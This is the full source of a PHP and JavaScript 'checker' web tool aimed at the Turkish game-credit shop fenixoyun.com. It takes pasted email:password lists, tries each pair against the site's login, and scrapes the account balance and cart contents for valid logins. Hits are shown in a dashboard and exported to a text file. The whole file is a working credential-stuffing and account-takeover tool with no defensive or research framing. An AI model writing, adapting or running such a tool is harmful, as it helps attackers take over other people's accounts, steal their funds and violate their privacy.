<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    function lr_parse($string, $left, $right) {
        $data = explode($left, $string);
        if (isset($data[1])) {
            $data = explode($right, $data[1]);
            return trim($data[0]);
        }
        return null;
    }

    $ch = curl_init("https://fenixoyun.com/giris");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36");
    $res1 = curl_exec($ch);
    preg_match('/OCSESSID=([^;]+)/', $res1, $match);
    $ocsessid = $match[1] ?? '';
    curl_close($ch);

    $boundary = "----WebKitFormBoundarybo72lj9OdUzOvxVr";
    $payload = "--$boundary\r\n";
    $payload .= "Content-Disposition: form-data; name=\"email\"\r\n\r\n$user\r\n";
    $payload .= "--$boundary\r\n";
    $payload .= "Content-Disposition: form-data; name=\"password\"\r\n\r\n$pass\r\n";
    $payload .= "--$boundary--\r\n";

    $headers = [
        "host: fenixoyun.com",
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "origin: https://fenixoyun.com",
        "referer: https://fenixoyun.com/giris",
        "cookie: OCSESSID=$ocsessid; language=tr-tr;",
        "content-type: multipart/form-data; boundary=$boundary"
    ];

    $ch = curl_init("https://fenixoyun.com/giris");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $res2 = curl_exec($ch);
    curl_close($ch);

    if (strpos($res2, 'Siparişlerim') !== false) {
        
        $ch = curl_init("https://fenixoyun.com/hesap");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["cookie: OCSESSID=$ocsessid; language=tr-tr;"]);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $res_hesap = curl_exec($ch);
        curl_close($ch);
        
        $bakiye = lr_parse($res_hesap, '<div class="fx-points-value">', '</div>') ?: '0.00';

        $ch = curl_init("https://fenixoyun.com/sepet");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["cookie: OCSESSID=$ocsessid; language=tr-tr;"]);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $res_sepet = curl_exec($ch);
        curl_close($ch);

        $sepet = lr_parse($res_sepet, 'class="text-left td-name"><a href="', '</td>') ?: 'Boş';
        if($sepet !== 'Boş') $sepet = strip_tags('<a href="' . $sepet);

        $detaylar = "Bakiye: $bakiye TL | Sepet: $sepet";

        echo json_encode([
            'status' => 'success',
            'user' => $user, 
            'pass' => $pass,
            'sayi' => $bakiye,
            'arabalar' => $detaylar
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user, 'pass' => $pass]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FENIXOYUN EXPORT | CPM STYLE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #060709; color: #e2e8f0; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        .neon-gold { box-shadow: 0 0 15px rgba(245, 197, 24, 0.2); border: 1px solid rgba(245, 197, 24, 0.4); }
        .neon-blue { box-shadow: 0 0 15px rgba(30, 58, 138, 0.2); border: 1px solid rgba(30, 58, 138, 0.4); }
        .neon-red { box-shadow: 0 0 15px rgba(220, 38, 38, 0.2); border: 1px solid rgba(220, 38, 38, 0.4); }
        .neon-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); }
        .main-card { background: rgba(13, 17, 23, 0.95); backdrop-filter: blur(10px); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
        .input-area { background: #0a0c10; border: 1px solid #2d3748; border-radius: 12px; color: #f5c518; font-family: 'Consolas', monospace; width: 100%; outline: none; }
        .input-area:focus { border-color: #f5c518; }
        .hit-box { background: linear-gradient(145deg, #0d1117, #07090c); border-left: 4px solid #f5c518; border-radius: 12px; }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-8">
        <div class="flex items-center gap-3">
            <div class="w-11 h-11 bg-[#f5c518] rounded-lg flex items-center justify-center shadow-lg shadow-yellow-600/30">
                <i class="fa-solid fa-gamepad text-black text-xl"></i>
            </div>
            <h1 class="text-2xl font-black tracking-tighter italic" style="font-family: 'Syncopate', sans-serif;">FENIX<span class="text-[#f5c518]">CHECKER</span></h1>
        </div>
        <a href="index.php" class="bg-white/5 hover:bg-yellow-600 hover:text-black border border-white/10 px-5 py-2.5 rounded-xl text-xs font-black uppercase tracking-widest transition-all italic">Geri Çıkış</a>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-5 mb-8">
        <div class="main-card p-6 neon-blue">
            <span class="text-blue-400 text-[10px] font-black uppercase mb-1.5 block">Kalan</span>
            <div class="text-4xl font-black" id="kalan_val">BİTTİ</div>
        </div>
        <div class="main-card p-6 neon-gold">
            <span class="text-[#f5c518] text-[10px] font-black uppercase mb-1.5 block">Hit</span>
            <div class="text-4xl font-black text-[#f5c518]" id="hit_count">0</div>
        </div>
        <div class="main-card p-6 neon-red">
            <span class="text-red-500 text-[10px] font-black uppercase mb-1.5 block">Fail</span>
            <div class="text-4xl font-black text-red-500" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-4 space-y-5">
            <div class="main-card p-6 neon-gold">
                <textarea id="accs" class="input-area h-[220px] p-4 text-xs" placeholder="email:şifre"></textarea>
                <button id="btn" onclick="startCheck()" class="w-full mt-5 py-4 bg-[#f5c518] hover:bg-yellow-500 rounded-xl text-black font-black uppercase tracking-widest text-sm shadow-md active:scale-95 transition-all">Taramayı Başlat</button>
            </div>
            <div class="main-card p-5 h-32 overflow-y-auto bg-black/50 font-mono text-[10px] text-yellow-200" id="mini_log">Fenix Sisteme Hazır.</div>
        </div>

        <div class="lg:col-span-8">
            <div class="flex justify-between items-end mb-4">
                <h2 class="text-xl font-black uppercase italic text-gray-200">Canlı Sonuçlar</h2>
                <button onclick="downloadHits()" class="bg-green-600 hover:bg-green-500 text-white px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest transition-all">TXT İndir</button>
            </div>
            <div class="main-card p-6 h-[660px] overflow-y-auto space-y-5 neon-gold" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full opacity-10 italic font-black uppercase">Fenix Verisi Bekleniyor...</div>
            </div>
        </div>
    </div>

    <script>
        let running = false; let hits = 0; let fails = 0; let hitResults = [];
        
        async function startCheck() {
            const list = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
            if(!list.length) return alert("Liste boş!");
            if(running) { running = false; return; }
            
            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "DURDUR"; 
            btn.classList.replace('bg-[#f5c518]', 'bg-red-600');
            btn.classList.replace('text-black', 'text-white');
            document.getElementById('kalan_val').innerText = list.length;
            
            for(let line of list) {
                if(!running) break;
                const [u, p] = line.trim().split(':');
                try {
                    const fd = new FormData(); 
                    fd.append('user', u); 
                    fd.append('pass', p);
                    
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();
                    const log = document.getElementById('mini_log');
                    
                    if(res.status === 'success') {
                        hits++; 
                        document.getElementById('hit_count').innerText = hits;
                        hitResults.push(`${res.user}:${res.pass} | Bakiye: ${res.sayi} | ${res.arabalar}`);
                        addHit(res);
                        log.innerHTML = `<div style="color:#f5c518">[HIT] ${u}</div>` + log.innerHTML;
                    } else { 
                        fails++; 
                        document.getElementById('fail_count').innerText = fails; 
                        log.innerHTML = `<div style="color:#ef4444">[FAIL] ${u}</div>` + log.innerHTML;
                    }
                } catch(e) { }
                document.getElementById('kalan_val').innerText = parseInt(document.getElementById('kalan_val').innerText) - 1;
            }
            running = false; 
            btn.innerText = "TARAMAYI BAŞLAT"; 
            btn.classList.replace('bg-red-600', 'bg-[#f5c518]');
            btn.classList.replace('text-white', 'text-black');
            document.getElementById('kalan_val').innerText = "BİTTİ";
        }

        function addHit(res) {
            const log = document.getElementById('hitLog');
            if(hits === 1) log.innerHTML = '';
            const div = document.createElement('div');
            div.className = 'hit-box p-5 mb-4 border-l-4 shadow-lg';
            
            div.innerHTML = `
                <div class="flex justify-between items-center mb-2">
                    <span class="text-sm font-bold text-yellow-500"><i class="fa-solid fa-user text-xs mr-1"></i> ${res.user}:${res.pass}</span>
                    <span class="text-2xl font-black text-white"><span class="text-xs text-yellow-500 mr-1">BAKİYE</span>${res.sayi} TL</span>
                </div>
                <div class="text-[11px] font-mono text-gray-400 italic bg-black/40 p-2 rounded border border-white/5">${res.arabalar}</div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (!hitResults.length) return;
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; 
            a.download = `FenixHits_${new Date().getTime()}.txt`; 
            a.click();
        }
    </script>
</body>
</html>